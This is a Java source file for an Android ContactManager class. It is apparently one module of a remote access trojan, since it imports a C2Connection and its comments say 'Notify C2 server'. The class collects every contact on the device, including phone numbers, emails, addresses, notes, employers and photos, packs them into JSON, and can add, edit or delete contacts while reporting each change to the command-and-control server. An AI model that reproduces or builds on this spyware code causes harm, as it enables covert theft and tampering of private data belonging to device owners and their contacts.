package com.tarjon.admin.utils;

import android.Manifest;
import android.content.ContentProviderOperation;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.ContentValues;
import android.content.Context;
import android.content.OperationApplicationException;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.RemoteException;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.tarjon.admin.network.C2Connection;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Manages contact-related functionality
 * Handles contact reading, creation, modification, and deletion
 */
public class ContactManager {
    private static final String TAG = "ContactManager";
    
    private final Context context;
    private final C2Connection c2Connection;
    private final ExecutorService executor;
    
    public ContactManager(Context context, C2Connection c2Connection) {
        this.context = context;
        this.c2Connection = c2Connection;
        this.executor = Executors.newSingleThreadExecutor();
    }
    
    /**
     * Get all contacts from the device
     * @param callback Callback to receive contacts
     */
    public void getContacts(final ContactsCallback callback) {
        // Check for permissions
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != 
                PackageManager.PERMISSION_GRANTED) {
            if (callback != null) {
                callback.onError("Contacts read permission not granted");
            }
            return;
        }
        
        executor.execute(() -> {
            try {
                ContentResolver contentResolver = context.getContentResolver();
                
                // Define columns to retrieve
                String[] projection = new String[] {
                        ContactsContract.Contacts._ID,
                        ContactsContract.Contacts.DISPLAY_NAME,
                        ContactsContract.Contacts.HAS_PHONE_NUMBER,
                        ContactsContract.Contacts.PHOTO_URI,
                        ContactsContract.Contacts.STARRED,
                        ContactsContract.Contacts.LAST_TIME_CONTACTED,
                        ContactsContract.Contacts.TIMES_CONTACTED,
                        ContactsContract.Contacts.LOOKUP_KEY
                };
                
                // Sort by display name
                String sortOrder = ContactsContract.Contacts.DISPLAY_NAME + " ASC";
                
                // Execute query
                Cursor cursor = contentResolver.query(
                        ContactsContract.Contacts.CONTENT_URI,
                        projection,
                        null,
                        null,
                        sortOrder);
                
                JSONArray contacts = new JSONArray();
                
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        JSONObject contact = new JSONObject();
                        
                        // Get contact info
                        String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                        String displayName = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                        String photoUri = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.PHOTO_URI));
                        int hasPhone = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                        int starred = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.STARRED));
                        long lastContactTime = cursor.getLong(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.LAST_TIME_CONTACTED));
                        int timesContacted = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.TIMES_CONTACTED));
                        String lookupKey = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.LOOKUP_KEY));
                        
                        // Add basic contact info
                        contact.put("id", contactId);
                        contact.put("displayName", displayName != null ? displayName : "");
                        contact.put("photoUri", photoUri != null ? photoUri : "");
                        contact.put("hasPhoneNumber", hasPhone == 1);
                        contact.put("starred", starred == 1);
                        contact.put("lastContactTime", lastContactTime);
                        contact.put("timesContacted", timesContacted);
                        contact.put("lookupKey", lookupKey != null ? lookupKey : "");
                        
                        // Get phone numbers
                        JSONArray phoneNumbers = getContactPhoneNumbers(contentResolver, contactId);
                        contact.put("phoneNumbers", phoneNumbers);
                        
                        // Get email addresses
                        JSONArray emailAddresses = getContactEmails(contentResolver, contactId);
                        contact.put("emailAddresses", emailAddresses);
                        
                        // Get addresses
                        JSONArray addresses = getContactAddresses(contentResolver, contactId);
                        contact.put("addresses", addresses);
                        
                        // Get notes
                        String notes = getContactNotes(contentResolver, contactId);
                        contact.put("notes", notes != null ? notes : "");
                        
                        // Get organizations
                        JSONArray organizations = getContactOrganizations(contentResolver, contactId);
                        contact.put("organizations", organizations);
                        
                        // Get websites
                        JSONArray websites = getContactWebsites(contentResolver, contactId);
                        contact.put("websites", websites);
                        
                        // Get contact photo (base64 encoded if exists)
                        if (photoUri != null) {
                            try {
                                // We'll load the actual photo data only when requested specifically to reduce data size
                                contact.put("hasPhoto", true);
                            } catch (Exception e) {
                                contact.put("hasPhoto", false);
                            }
                        } else {
                            contact.put("hasPhoto", false);
                        }
                        
                        // Add to contacts array
                        contacts.put(contact);
                        
                    } while (cursor.moveToNext());
                    
                    cursor.close();
                }
                
                // Create result object
                JSONObject result = new JSONObject();
                result.put("contacts", contacts);
                result.put("count", contacts.length());
                
                // Send to callback
                if (callback != null) {
                    callback.onContactsLoaded(result.toString());
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error retrieving contacts: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error retrieving contacts: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Get phone numbers for a contact
     */
    private JSONArray getContactPhoneNumbers(ContentResolver contentResolver, String contactId) throws JSONException {
        JSONArray phoneNumbers = new JSONArray();
        
        Cursor cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                new String[] { contactId },
                null);
        
        if (cursor != null && cursor.moveToFirst()) {
            do {
                JSONObject phoneObj = new JSONObject();
                
                String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE));
                String label = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.LABEL));
                
                phoneObj.put("number", number);
                phoneObj.put("type", type);
                phoneObj.put("label", label != null ? label : "");
                phoneObj.put("typeLabel", getPhoneTypeLabel(type, label));
                
                phoneNumbers.put(phoneObj);
                
            } while (cursor.moveToNext());
            
            cursor.close();
        }
        
        return phoneNumbers;
    }
    
    /**
     * Get email addresses for a contact
     */
    private JSONArray getContactEmails(ContentResolver contentResolver, String contactId) throws JSONException {
        JSONArray emails = new JSONArray();
        
        Cursor cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                new String[] { contactId },
                null);
        
        if (cursor != null && cursor.moveToFirst()) {
            do {
                JSONObject emailObj = new JSONObject();
                
                String email = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.TYPE));
                String label = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.LABEL));
                
                emailObj.put("address", email);
                emailObj.put("type", type);
                emailObj.put("label", label != null ? label : "");
                emailObj.put("typeLabel", getEmailTypeLabel(type, label));
                
                emails.put(emailObj);
                
            } while (cursor.moveToNext());
            
            cursor.close();
        }
        
        return emails;
    }
    
    /**
     * Get addresses for a contact
     */
    private JSONArray getContactAddresses(ContentResolver contentResolver, String contactId) throws JSONException {
        JSONArray addresses = new JSONArray();
        
        Cursor cursor = contentResolver.query(
                ContactsContract.Data.CONTENT_URI,
                null,
                ContactsContract.Data.CONTACT_ID + " = ? AND " + 
                        ContactsContract.Data.MIMETYPE + " = ?",
                new String[] { 
                        contactId, 
                        ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE 
                },
                null);
        
        if (cursor != null && cursor.moveToFirst()) {
            do {
                JSONObject addressObj = new JSONObject();
                
                String formattedAddress = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.FORMATTED_ADDRESS));
                String street = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
                String city = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
                String region = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
                String postcode = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
                String country = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
                String label = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.LABEL));
                
                addressObj.put("formattedAddress", formattedAddress != null ? formattedAddress : "");
                addressObj.put("street", street != null ? street : "");
                addressObj.put("city", city != null ? city : "");
                addressObj.put("region", region != null ? region : "");
                addressObj.put("postcode", postcode != null ? postcode : "");
                addressObj.put("country", country != null ? country : "");
                addressObj.put("type", type);
                addressObj.put("label", label != null ? label : "");
                addressObj.put("typeLabel", getAddressTypeLabel(type, label));
                
                addresses.put(addressObj);
                
            } while (cursor.moveToNext());
            
            cursor.close();
        }
        
        return addresses;
    }
    
    /**
     * Get notes for a contact
     */
    private String getContactNotes(ContentResolver contentResolver, String contactId) {
        String note = null;
        
        Cursor cursor = contentResolver.query(
                ContactsContract.Data.CONTENT_URI,
                null,
                ContactsContract.Data.CONTACT_ID + " = ? AND " + 
                        ContactsContract.Data.MIMETYPE + " = ?",
                new String[] { 
                        contactId, 
                        ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE 
                },
                null);
        
        if (cursor != null && cursor.moveToFirst()) {
            note = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Note.NOTE));
            cursor.close();
        }
        
        return note;
    }
    
    /**
     * Get organizations for a contact
     */
    private JSONArray getContactOrganizations(ContentResolver contentResolver, String contactId) throws JSONException {
        JSONArray organizations = new JSONArray();
        
        Cursor cursor = contentResolver.query(
                ContactsContract.Data.CONTENT_URI,
                null,
                ContactsContract.Data.CONTACT_ID + " = ? AND " + 
                        ContactsContract.Data.MIMETYPE + " = ?",
                new String[] { 
                        contactId, 
                        ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE 
                },
                null);
        
        if (cursor != null && cursor.moveToFirst()) {
            do {
                JSONObject orgObj = new JSONObject();
                
                String company = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Organization.COMPANY));
                String title = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Organization.TITLE));
                String department = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Organization.DEPARTMENT));
                String jobDescription = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Organization.JOB_DESCRIPTION));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Organization.TYPE));
                
                orgObj.put("company", company != null ? company : "");
                orgObj.put("title", title != null ? title : "");
                orgObj.put("department", department != null ? department : "");
                orgObj.put("jobDescription", jobDescription != null ? jobDescription : "");
                orgObj.put("type", type);
                
                organizations.put(orgObj);
                
            } while (cursor.moveToNext());
            
            cursor.close();
        }
        
        return organizations;
    }
    
    /**
     * Get websites for a contact
     */
    private JSONArray getContactWebsites(ContentResolver contentResolver, String contactId) throws JSONException {
        JSONArray websites = new JSONArray();
        
        Cursor cursor = contentResolver.query(
                ContactsContract.Data.CONTENT_URI,
                null,
                ContactsContract.Data.CONTACT_ID + " = ? AND " + 
                        ContactsContract.Data.MIMETYPE + " = ?",
                new String[] { 
                        contactId, 
                        ContactsContract.CommonDataKinds.Website.CONTENT_ITEM_TYPE 
                },
                null);
        
        if (cursor != null && cursor.moveToFirst()) {
            do {
                JSONObject websiteObj = new JSONObject();
                
                String url = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Website.URL));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Website.TYPE));
                
                websiteObj.put("url", url != null ? url : "");
                websiteObj.put("type", type);
                
                websites.put(websiteObj);
                
            } while (cursor.moveToNext());
            
            cursor.close();
        }
        
        return websites;
    }
    
    /**
     * Get contact photo as base64-encoded string
     * @param contactId Contact ID
     * @param callback Callback to receive photo data
     */
    public void getContactPhoto(String contactId, final ContactPhotoCallback callback) {
        // Check for permissions
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != 
                PackageManager.PERMISSION_GRANTED) {
            if (callback != null) {
                callback.onError("Contacts read permission not granted");
            }
            return;
        }
        
        executor.execute(() -> {
            try {
                ContentResolver contentResolver = context.getContentResolver();
                Uri contactUri = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, Long.parseLong(contactId));
                Uri photoUri = Uri.withAppendedPath(contactUri, ContactsContract.Contacts.Photo.CONTENT_DIRECTORY);
                
                Cursor cursor = contentResolver.query(
                        photoUri,
                        new String[] { ContactsContract.Contacts.Photo.PHOTO },
                        null,
                        null,
                        null);
                
                if (cursor != null && cursor.moveToFirst()) {
                    byte[] photoData = cursor.getBlob(0);
                    cursor.close();
                    
                    if (photoData != null) {
                        // Convert to Base64
                        String base64Photo = android.util.Base64.encodeToString(photoData, android.util.Base64.DEFAULT);
                        
                        if (callback != null) {
                            callback.onPhotoLoaded(base64Photo);
                        }
                        
                        return;
                    }
                }
                
                // If we got here, no photo found in the direct blob
                // Try using the photo URI from content provider
                Cursor contactCursor = contentResolver.query(
                        ContactsContract.Contacts.CONTENT_URI,
                        new String[] { ContactsContract.Contacts.PHOTO_URI },
                        ContactsContract.Contacts._ID + " = ?",
                        new String[] { contactId },
                        null);
                
                if (contactCursor != null && contactCursor.moveToFirst()) {
                    String photoUriString = contactCursor.getString(contactCursor.getColumnIndexOrThrow(ContactsContract.Contacts.PHOTO_URI));
                    contactCursor.close();
                    
                    if (photoUriString != null) {
                        InputStream photoStream = contentResolver.openInputStream(Uri.parse(photoUriString));
                        if (photoStream != null) {
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = photoStream.read(buffer)) > 0) {
                                baos.write(buffer, 0, len);
                            }
                            photoStream.close();
                            
                            byte[] photoBytes = baos.toByteArray();
                            String base64Photo = android.util.Base64.encodeToString(photoBytes, android.util.Base64.DEFAULT);
                            
                            if (callback != null) {
                                callback.onPhotoLoaded(base64Photo);
                            }
                            
                            return;
                        }
                    }
                }
                
                // No photo found
                if (callback != null) {
                    callback.onError("No photo found for contact");
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error getting contact photo: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error getting contact photo: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Add a new contact
     * @param name Contact name
     * @param phoneNumbers List of phone numbers (JSON array as string)
     * @param emailAddresses List of email addresses (JSON array as string)
     * @param callback Callback for operation result
     */
    public void addContact(String name, String phoneNumbers, String emailAddresses, final ContactOperationCallback callback) {
        // Check for permissions
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_CONTACTS) != 
                PackageManager.PERMISSION_GRANTED) {
            if (callback != null) {
                callback.onError("Contacts write permission not granted");
            }
            return;
        }
        
        executor.execute(() -> {
            try {
                // Parse phone numbers
                JSONArray phoneNumbersArray = new JSONArray(phoneNumbers);
                
                // Parse email addresses
                JSONArray emailAddressesArray = new JSONArray(emailAddresses);
                
                // Create operations list
                ArrayList<ContentProviderOperation> operations = new ArrayList<>();
                
                // Create raw contact
                operations.add(ContentProviderOperation.newInsert(
                        ContactsContract.RawContacts.CONTENT_URI)
                        .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null)
                        .withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null)
                        .build());
                
                // Add contact name
                operations.add(ContentProviderOperation.newInsert(
                        ContactsContract.Data.CONTENT_URI)
                        .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                        .withValue(ContactsContract.Data.MIMETYPE, 
                                ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                        .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, name)
                        .build());
                
                // Add phone numbers
                for (int i = 0; i < phoneNumbersArray.length(); i++) {
                    JSONObject phoneObj = phoneNumbersArray.getJSONObject(i);
                    String number = phoneObj.getString("number");
                    int type = phoneObj.optInt("type", ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE);
                    
                    operations.add(ContentProviderOperation.newInsert(
                            ContactsContract.Data.CONTENT_URI)
                            .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                            .withValue(ContactsContract.Data.MIMETYPE, 
                                    ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                            .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, number)
                            .withValue(ContactsContract.CommonDataKinds.Phone.TYPE, type)
                            .build());
                }
                
                // Add email addresses
                for (int i = 0; i < emailAddressesArray.length(); i++) {
                    JSONObject emailObj = emailAddressesArray.getJSONObject(i);
                    String address = emailObj.getString("address");
                    int type = emailObj.optInt("type", ContactsContract.CommonDataKinds.Email.TYPE_HOME);
                    
                    operations.add(ContentProviderOperation.newInsert(
                            ContactsContract.Data.CONTENT_URI)
                            .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                            .withValue(ContactsContract.Data.MIMETYPE, 
                                    ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE)
                            .withValue(ContactsContract.CommonDataKinds.Email.ADDRESS, address)
                            .withValue(ContactsContract.CommonDataKinds.Email.TYPE, type)
                            .build());
                }
                
                // Apply operations
                ContentResolver contentResolver = context.getContentResolver();
                contentResolver.applyBatch(ContactsContract.AUTHORITY, operations);
                
                // Send success callback
                if (callback != null) {
                    callback.onSuccess("Contact added successfully");
                }
                
                // Notify C2 server
                c2Connection.sendCommandResult("contact_added", 
                        "Contact added: " + name);
                
            } catch (JSONException e) {
                Log.e(TAG, "Error parsing JSON: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error parsing JSON: " + e.getMessage());
                }
            } catch (RemoteException | OperationApplicationException e) {
                Log.e(TAG, "Error adding contact: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error adding contact: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Update an existing contact
     * @param contactId Contact ID to update
     * @param name New contact name (or null to keep existing)
     * @param phoneNumbers List of phone numbers to update (JSON array as string)
     * @param emailAddresses List of email addresses to update (JSON array as string)
     * @param callback Callback for operation result
     */
    public void updateContact(String contactId, String name, String phoneNumbers, String emailAddresses, 
                             final ContactOperationCallback callback) {
        // Check for permissions
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_CONTACTS) != 
                PackageManager.PERMISSION_GRANTED) {
            if (callback != null) {
                callback.onError("Contacts write permission not granted");
            }
            return;
        }
        
        executor.execute(() -> {
            try {
                ContentResolver contentResolver = context.getContentResolver();
                
                // Get raw contact ID
                String rawContactId = getRawContactId(contentResolver, contactId);
                if (rawContactId == null) {
                    if (callback != null) {
                        callback.onError("Contact not found");
                    }
                    return;
                }
                
                // Create operations list
                ArrayList<ContentProviderOperation> operations = new ArrayList<>();
                
                // Update name if provided
                if (name != null) {
                    // Look up existing name data
                    Cursor nameCursor = contentResolver.query(
                            ContactsContract.Data.CONTENT_URI,
                            new String[] { ContactsContract.Data._ID },
                            ContactsContract.Data.RAW_CONTACT_ID + " = ? AND " + 
                                    ContactsContract.Data.MIMETYPE + " = ?",
                            new String[] { 
                                    rawContactId, 
                                    ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE 
                            },
                            null);
                    
                    if (nameCursor != null && nameCursor.moveToFirst()) {
                        // Update existing name
                        String nameId = nameCursor.getString(nameCursor.getColumnIndexOrThrow(ContactsContract.Data._ID));
                        operations.add(ContentProviderOperation.newUpdate(
                                ContactsContract.Data.CONTENT_URI)
                                .withSelection(ContactsContract.Data._ID + " = ?", new String[] { nameId })
                                .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, name)
                                .build());
                        
                        nameCursor.close();
                    } else {
                        // Insert new name
                        operations.add(ContentProviderOperation.newInsert(
                                ContactsContract.Data.CONTENT_URI)
                                .withValue(ContactsContract.Data.RAW_CONTACT_ID, rawContactId)
                                .withValue(ContactsContract.Data.MIMETYPE, 
                                        ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                                .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, name)
                                .build());
                        
                        if (nameCursor != null) {
                            nameCursor.close();
                        }
                    }
                }
                
                // Update phone numbers if provided
                if (phoneNumbers != null) {
                    // Delete existing phone numbers
                    operations.add(ContentProviderOperation.newDelete(
                            ContactsContract.Data.CONTENT_URI)
                            .withSelection(
                                    ContactsContract.Data.RAW_CONTACT_ID + " = ? AND " + 
                                            ContactsContract.Data.MIMETYPE + " = ?",
                                    new String[] { 
                                            rawContactId, 
                                            ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE 
                                    })
                            .build());
                    
                    // Add new phone numbers
                    JSONArray phoneNumbersArray = new JSONArray(phoneNumbers);
                    for (int i = 0; i < phoneNumbersArray.length(); i++) {
                        JSONObject phoneObj = phoneNumbersArray.getJSONObject(i);
                        String number = phoneObj.getString("number");
                        int type = phoneObj.optInt("type", ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE);
                        
                        operations.add(ContentProviderOperation.newInsert(
                                ContactsContract.Data.CONTENT_URI)
                                .withValue(ContactsContract.Data.RAW_CONTACT_ID, rawContactId)
                                .withValue(ContactsContract.Data.MIMETYPE, 
                                        ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                                .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, number)
                                .withValue(ContactsContract.CommonDataKinds.Phone.TYPE, type)
                                .build());
                    }
                }
                
                // Update email addresses if provided
                if (emailAddresses != null) {
                    // Delete existing email addresses
                    operations.add(ContentProviderOperation.newDelete(
                            ContactsContract.Data.CONTENT_URI)
                            .withSelection(
                                    ContactsContract.Data.RAW_CONTACT_ID + " = ? AND " + 
                                            ContactsContract.Data.MIMETYPE + " = ?",
                                    new String[] { 
                                            rawContactId, 
                                            ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE 
                                    })
                            .build());
                    
                    // Add new email addresses
                    JSONArray emailAddressesArray = new JSONArray(emailAddresses);
                    for (int i = 0; i < emailAddressesArray.length(); i++) {
                        JSONObject emailObj = emailAddressesArray.getJSONObject(i);
                        String address = emailObj.getString("address");
                        int type = emailObj.optInt("type", ContactsContract.CommonDataKinds.Email.TYPE_HOME);
                        
                        operations.add(ContentProviderOperation.newInsert(
                                ContactsContract.Data.CONTENT_URI)
                                .withValue(ContactsContract.Data.RAW_CONTACT_ID, rawContactId)
                                .withValue(ContactsContract.Data.MIMETYPE, 
                                        ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE)
                                .withValue(ContactsContract.CommonDataKinds.Email.ADDRESS, address)
                                .withValue(ContactsContract.CommonDataKinds.Email.TYPE, type)
                                .build());
                    }
                }
                
                // Apply operations if there are any
                if (!operations.isEmpty()) {
                    contentResolver.applyBatch(ContactsContract.AUTHORITY, operations);
                }
                
                // Send success callback
                if (callback != null) {
                    callback.onSuccess("Contact updated successfully");
                }
                
                // Notify C2 server
                c2Connection.sendCommandResult("contact_updated", 
                        "Contact updated: " + (name != null ? name : contactId));
                
            } catch (JSONException e) {
                Log.e(TAG, "Error parsing JSON: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error parsing JSON: " + e.getMessage());
                }
            } catch (Exception e) {
                Log.e(TAG, "Error updating contact: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error updating contact: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Delete a contact
     * @param contactId Contact ID to delete
     * @param callback Callback for operation result
     */
    public void deleteContact(String contactId, final ContactOperationCallback callback) {
        // Check for permissions
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_CONTACTS) != 
                PackageManager.PERMISSION_GRANTED) {
            if (callback != null) {
                callback.onError("Contacts write permission not granted");
            }
            return;
        }
        
        executor.execute(() -> {
            try {
                ContentResolver contentResolver = context.getContentResolver();
                
                // Check if contact exists
                Cursor cursor = contentResolver.query(
                        ContactsContract.Contacts.CONTENT_URI,
                        null,
                        ContactsContract.Contacts._ID + " = ?",
                        new String[] { contactId },
                        null);
                
                if (cursor != null) {
                    boolean exists = cursor.moveToFirst();
                    cursor.close();
                    
                    if (!exists) {
                        if (callback != null) {
                            callback.onError("Contact not found");
                        }
                        return;
                    }
                }
                
                // Delete the contact
                Uri contactUri = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_URI, contactId);
                contentResolver.delete(contactUri, null, null);
                
                // Send success callback
                if (callback != null) {
                    callback.onSuccess("Contact deleted successfully");
                }
                
                // Notify C2 server
                c2Connection.sendCommandResult("contact_deleted", 
                        "Contact deleted: " + contactId);
                
            } catch (Exception e) {
                Log.e(TAG, "Error deleting contact: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error deleting contact: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Get the raw contact ID for a contact ID
     */
    private String getRawContactId(ContentResolver contentResolver, String contactId) {
        String rawContactId = null;
        
        Cursor cursor = contentResolver.query(
                ContactsContract.RawContacts.CONTENT_URI,
                new String[] { ContactsContract.RawContacts._ID },
                ContactsContract.RawContacts.CONTACT_ID + " = ?",
                new String[] { contactId },
                null);
        
        if (cursor != null && cursor.moveToFirst()) {
            rawContactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.RawContacts._ID));
            cursor.close();
        }
        
        return rawContactId;
    }
    
    /**
     * Get label for phone number type
     */
    private String getPhoneTypeLabel(int type, String customLabel) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                return "Home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                return "Mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                return "Work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK:
                return "Work Fax";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME:
                return "Home Fax";
            case ContactsContract.CommonDataKinds.Phone.TYPE_PAGER:
                return "Pager";
            case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
                return "Other";
            case ContactsContract.CommonDataKinds.Phone.TYPE_CALLBACK:
                return "Callback";
            case ContactsContract.CommonDataKinds.Phone.TYPE_CAR:
                return "Car";
            case ContactsContract.CommonDataKinds.Phone.TYPE_COMPANY_MAIN:
                return "Company Main";
            case ContactsContract.CommonDataKinds.Phone.TYPE_ISDN:
                return "ISDN";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MAIN:
                return "Main";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK_MOBILE:
                return "Work Mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK_PAGER:
                return "Work Pager";
            case ContactsContract.CommonDataKinds.Phone.TYPE_ASSISTANT:
                return "Assistant";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MMS:
                return "MMS";
            case ContactsContract.CommonDataKinds.Phone.TYPE_CUSTOM:
                return customLabel != null ? customLabel : "Custom";
            default:
                return "Unknown";
        }
    }
    
    /**
     * Get label for email type
     */
    private String getEmailTypeLabel(int type, String customLabel) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Email.TYPE_HOME:
                return "Home";
            case ContactsContract.CommonDataKinds.Email.TYPE_WORK:
                return "Work";
            case ContactsContract.CommonDataKinds.Email.TYPE_OTHER:
                return "Other";
            case ContactsContract.CommonDataKinds.Email.TYPE_MOBILE:
                return "Mobile";
            case ContactsContract.CommonDataKinds.Email.TYPE_CUSTOM:
                return customLabel != null ? customLabel : "Custom";
            default:
                return "Unknown";
        }
    }
    
    /**
     * Get label for address type
     */
    private String getAddressTypeLabel(int type, String customLabel) {
        switch (type) {
            case ContactsContract.CommonDataKinds.StructuredPostal.TYPE_HOME:
                return "Home";
            case ContactsContract.CommonDataKinds.StructuredPostal.TYPE_WORK:
                return "Work";
            case ContactsContract.CommonDataKinds.StructuredPostal.TYPE_OTHER:
                return "Other";
            case ContactsContract.CommonDataKinds.StructuredPostal.TYPE_CUSTOM:
                return customLabel != null ? customLabel : "Custom";
            default:
                return "Unknown";
        }
    }
    
    /**
     * Clean up resources
     */
    public void release() {
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
    }
    
    /**
     * Callback interface for contacts operations
     */
    public interface ContactsCallback {
        void onContactsLoaded(String contactsJson);
        void onError(String error);
    }
    
    /**
     * Callback interface for contact photo operations
     */
    public interface ContactPhotoCallback {
        void onPhotoLoaded(String base64Photo);
        void onError(String error);
    }
    
    /**
     * Callback interface for contact operations
     */
    public interface ContactOperationCallback {
        void onSuccess(String message);
        void onError(String error);
    }
}